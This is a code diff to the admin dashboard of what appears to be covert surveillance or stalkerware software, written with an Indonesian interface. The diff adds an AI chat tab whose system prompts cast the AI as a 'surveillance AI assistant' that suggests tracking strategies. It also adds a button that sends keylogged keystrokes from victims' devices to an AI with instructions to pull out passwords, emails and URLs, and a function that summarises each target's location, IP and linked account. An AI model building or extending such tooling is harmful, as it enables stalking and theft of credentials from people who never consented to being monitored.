@@ -366,18 +366,27 @@
 
                     <!-- TAB: AI CHAT -->
                     <div class="tab-content" id="tab-aichat">
-                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Riapan percakapan AI dengan target.</p>
-                        <div style="display:flex;gap:8px;margin-bottom:10px;">
-                            <select id="aiChatDeviceSelect" style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;" onchange="loadAIChatHistory()">
-                                <option value="">Pilih device...</option>
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">AI Chat dengan konteks device target (MiMo API via server).</p>
+                        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                            <select id="aiChatDeviceSelect" style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <option value="">Pilih device (opsional)</option>
                             </select>
-                            <button class="header-btn" onclick="loadAIChatHistory()">Refresh</button>
+                            <select id="aiChatMode" style="padding:6px 8px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.72rem;">
+                                <option value="normal">Normal</option>
+                                <option value="creative">Creative</option>
+                            </select>
                         </div>
-                        <div id="aiChatHistory" style="max-height:300px;overflow-y:auto;background:var(--bg);border-radius:8px;padding:10px;">
-                            <div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Pilih device untuk melihat riapan chat</div>
+                        <div id="aiChatMessages" style="max-height:200px;overflow-y:auto;background:var(--bg);border-radius:8px;padding:10px;margin-bottom:8px;font-size:0.78rem;line-height:1.6;">
+                            <div style="color:var(--text3);text-align:center;padding:20px;">AI siap digunakan. Ketik pesan atau gunakan quick actions.</div>
                         </div>
-                        <div style="margin-top:8px;display:flex;gap:6px;">
-                            <span style="font-size:0.72rem;color:var(--text3);">AI Chat menggunakan Mimo API (server-side)</span>
+                        <div style="display:flex;gap:6px;margin-bottom:8px;">
+                            <input id="aiChatInput" style="flex:1;padding:8px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;" placeholder="Tanya AI...">
+                            <button class="header-btn" onclick="sendAIChat()" style="font-size:0.78rem;">Kirim</button>
+                        </div>
+                        <div style="display:flex;gap:6px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="aiAnalyzeKeystrokes()" style="font-size:0.7rem;border-color:#7c3aed;">&#x1f50d; Analisis Keystroke</button>
+                            <button class="header-btn" onclick="aiGenerateSummary()" style="font-size:0.7rem;border-color:#00d4ff;">&#x1f4ca; Generate Summary</button>
+                            <button class="header-btn" onclick="aiClearChat()" style="font-size:0.7rem;border-color:#ff6b6b;color:#ff6b6b;">Hapus Chat</button>
                         </div>
                     </div>
 
@@ -1544,45 +1553,160 @@
             showToast(`Forensics: ${data.type} - ${data.label}`, 'warn');
         });
 
-        // === AI CHAT ===
+        // === AI CHAT (MiMo API via server proxy) ===
+        let aiChatContext = [];
+
         function loadAIChatDevices() {
             const sel = document.getElementById('aiChatDeviceSelect');
-            sel.innerHTML = '<option value="">Pilih device...</option>';
+            if (!sel) return;
+            sel.innerHTML = '<option value="">Pilih device (opsional)</option>';
             for (const [id, d] of Object.entries(devices)) {
                 sel.innerHTML += `<option value="${id}">${d.label} (${id.slice(0,8)}...)</option>`;
             }
         }
 
-        function loadAIChatHistory() {
-            const id = document.getElementById('aiChatDeviceSelect').value;
-            const el = document.getElementById('aiChatHistory');
-            if (!id) { el.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Pilih device untuk melihat riapan chat</div>'; return; }
-            el.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Memuat...</div>';
-            fetch(SERVER_URL + '/api/ai-chat/' + id).then(r => r.json()).then(messages => {
-                if (!messages || !messages.length) {
-                    el.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Belum ada percakapan</div>';
-                    return;
-                }
-                el.innerHTML = messages.map(m => {
-                    const isUser = m.role === 'user';
-                    const time = new Date(m.time).toLocaleTimeString();
-                    const bg = isUser ? 'rgba(0,212,255,0.1)' : 'rgba(124,58,237,0.1)';
-                    const align = isUser ? 'flex-end' : 'flex-start';
-                    const label = isUser ? 'User' : 'AI';
-                    const labelColor = isUser ? '#00d4ff' : '#7c3aed';
-                    return `<div style="display:flex;flex-direction:column;align-items:${align};margin-bottom:8px;">
-                        <div style="font-size:0.68rem;color:${labelColor};margin-bottom:2px;">${label} · ${time}</div>
-                        <div style="max-width:85%;background:${bg};padding:8px 12px;border-radius:8px;font-size:0.8rem;color:var(--text);line-height:1.5;word-break:break-word;">${m.content}</div>
-                    </div>`;
-                }).join('');
-                el.scrollTop = el.scrollHeight;
-            }).catch(() => { el.innerHTML = '<div style="color:var(--text3);text-align:center;padding:20px;">Gagal memuat</div>'; });
+        function addAIChatMessage(role, content) {
+            const el = document.getElementById('aiChatMessages');
+            if (!el) return;
+            const isUser = role === 'user';
+            const time = new Date().toLocaleTimeString();
+            const bg = isUser ? 'rgba(0,212,255,0.1)' : 'rgba(124,58,237,0.15)';
+            const align = isUser ? 'flex-end' : 'flex-start';
+            const label = isUser ? 'Kamu' : 'AI';
+            const labelColor = isUser ? '#00d4ff' : '#7c3aed';
+            el.innerHTML += `<div style="display:flex;flex-direction:column;align-items:${align};margin-bottom:8px;">
+                <div style="font-size:0.68rem;color:${labelColor};margin-bottom:2px;">${label} · ${time}</div>
+                <div style="max-width:85%;background:${bg};padding:8px 12px;border-radius:8px;font-size:0.8rem;color:var(--text);line-height:1.5;word-break:break-word;">${content}</div>
+            </div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        socket.on('ai-chat-update', (data) => {
-            const sel = document.getElementById('aiChatDeviceSelect');
-            if (sel.value === data.deviceId) loadAIChatHistory();
-            showToast(`AI Chat: ${data.deviceId.slice(0,8)}...`, 'info');
+        async function sendAIChat() {
+            const input = document.getElementById('aiChatInput');
+            const msg = input.value.trim();
+            if (!msg) return;
+            input.value = '';
+            addAIChatMessage('user', msg);
+            addAIChatMessage('ai', 'Memproses...');
+
+            const deviceId = document.getElementById('aiChatDeviceSelect').value;
+            const mode = document.getElementById('aiChatMode').value;
+
+            try {
+                const res = await fetch(SERVER_URL + '/api/ai/chat?token=' + encodeURIComponent(window._adminToken), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        messages: [
+                            { role: 'system', content: 'You are Neural AI, an advanced surveillance AI assistant. You have access to device tracking data. Respond in Indonesian. Be concise and analytical. You can help analyze target data, suggest tracking strategies, and provide insights.' },
+                            ...aiChatContext.slice(-10),
+                            { role: 'user', content: msg }
+                        ],
+                        deviceId: deviceId || undefined,
+                        mode
+                    })
+                });
+                const data = await res.json();
+                const reply = data.choices?.[0]?.message?.content || data.error || 'Gagal mendapatkan respons';
+                // Replace loading message
+                const el = document.getElementById('aiChatMessages');
+                if (el) el.innerHTML = el.innerHTML.replace(
+                    '<div style="font-size:0.68rem;color:#7c3aed;margin-bottom:2px;">AI · ' + new Date().toLocaleTimeString() + '</div>\n                <div style="max-width:85%;background:rgba(124,58,237,0.15);padding:8px 12px;border-radius:8px;font-size:0.8rem;color:var(--text);line-height:1.5;word-break:break-word;">Memproses...</div>',
+                    '<div style="font-size:0.68rem;color:#7c3aed;margin-bottom:2px;">AI · ' + new Date().toLocaleTimeString() + '</div>\n                <div style="max-width:85%;background:rgba(124,58,237,0.15);padding:8px 12px;border-radius:8px;font-size:0.8rem;color:var(--text);line-height:1.5;word-break:break-word;">' + reply + '</div>'
+                );
+                aiChatContext.push({ role: 'user', content: msg }, { role: 'assistant', content: reply });
+            } catch (e) {
+                addAIChatMessage('ai', 'Error: ' + e.message);
+            }
+        }
+
+        async function aiAnalyzeKeystrokes() {
+            const deviceId = document.getElementById('aiChatDeviceSelect').value;
+            if (!deviceId) { showToast('Pilih device dulu', 'error'); return; }
+            addAIChatMessage('ai', 'Menganalisis keystroke data...');
+            try {
+                const res = await fetch(SERVER_URL + '/api/keystrokes/' + deviceId);
+                const data = await res.json();
+                const keys = data.keystrokes || data || [];
+                if (!keys.length) { addAIChatMessage('ai', 'Belum ada data keystroke untuk device ini.'); return; }
+                const text = keys.slice(-100).map(k => k.k || k.key || '').filter(Boolean).join('');
+                const aiRes = await fetch(SERVER_URL + '/api/ai/chat', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        messages: [
+                            { role: 'system', content: 'Analyze this keystroke data. Look for passwords, emails, URLs, and other sensitive info. Respond in Indonesian.' },
+                            { role: 'user', content: 'Keystroke data (last 100 keystrokes):\n' + text.slice(0, 2000) }
+                        ],
+                        mode: 'normal'
+                    })
+                });
+                const aiData = await aiRes.json();
+                const analysis = aiData.choices?.[0]?.message?.content || 'Analisis gagal';
+                const el = document.getElementById('aiChatMessages');
+                if (el) el.innerHTML = el.innerHTML.replace(
+                    'Menganalisis keystroke data...',
+                    '<strong>Analisis Keystroke:</strong><br>' + analysis.replace(/\n/g, '<br>')
+                );
+            } catch (e) {
+                addAIChatMessage('ai', 'Error: ' + e.message);
+            }
+        }
+
+        async function aiGenerateSummary() {
+            const deviceId = document.getElementById('aiChatDeviceSelect').value;
+            if (!deviceId) { showToast('Pilih device dulu', 'error'); return; }
+            addAIChatMessage('ai', 'Membuat ringkasan device...');
+            try {
+                const dev = devices[deviceId];
+                if (!dev) { addAIChatMessage('ai', 'Device tidak ditemukan.'); return; }
+                const summary = [
+                    `Device: ${dev.label || 'Unknown'}`,
+                    `IP: ${dev.ip || '-'}`,
+                    `First seen: ${new Date(dev.firstSeen).toLocaleString()}`,
+                    `Last seen: ${new Date(dev.lastSeen).toLocaleString()}`,
+                    `Online: ${dev.online ? 'Yes' : 'No'}`,
+                    `Location: ${dev.location ? dev.location.lat + ', ' + dev.location.lng : 'Unknown'}`,
+                    `Battery: ${dev.battery ? dev.battery.level + '%' : 'Unknown'}`,
+                    `Snapshots: ${dev.snapshotsCount || 0}`,
+                    `History entries: ${dev.history ? dev.history.length : 0}`,
+                    `Linked account: ${dev.linkedAccount?.email || 'None'}`,
+                    `OS: ${dev.os || 'Unknown'}`,
+                    `Browser: ${dev.browser || 'Unknown'}`
+                ].join('\n');
+
+                const aiRes = await fetch(SERVER_URL + '/api/ai/chat', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        messages: [
+                            { role: 'system', content: 'You are a surveillance analyst. Summarize this device data and give risk assessment. Respond in Indonesian.' },
+                            { role: 'user', content: 'Device data:\n' + summary }
+                        ],
+                        deviceId,
+                        mode: 'normal'
+                    })
+                });
+                const aiData = await aiRes.json();
+                const report = aiData.choices?.[0]?.message?.content || 'Gagal';
+                const el = document.getElementById('aiChatMessages');
+                if (el) el.innerHTML = el.innerHTML.replace(
+                    'Membuat ringkasan device...',
+                    '<strong>Ringkasan Device:</strong><br>' + report.replace(/\n/g, '<br>')
+                );
+            } catch (e) {
+                addAIChatMessage('ai', 'Error: ' + e.message);
+            }
+        }
+
+        function aiClearChat() {
+            const el = document.getElementById('aiChatMessages');
+            if (el) el.innerHTML = '<div style="color:var(--text3);text-align:center;padding:20px;">AI siap digunakan. Ketik pesan atau gunakan quick actions.</div>';
+            aiChatContext = [];
+        }
+
+        // Enter key to send
+        document.addEventListener('DOMContentLoaded', () => {
+            const input = document.getElementById('aiChatInput');
+            if (input) input.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendAIChat(); });
         });
 
         // Patch selectDevice to also load profile, forensics, targets, live cam
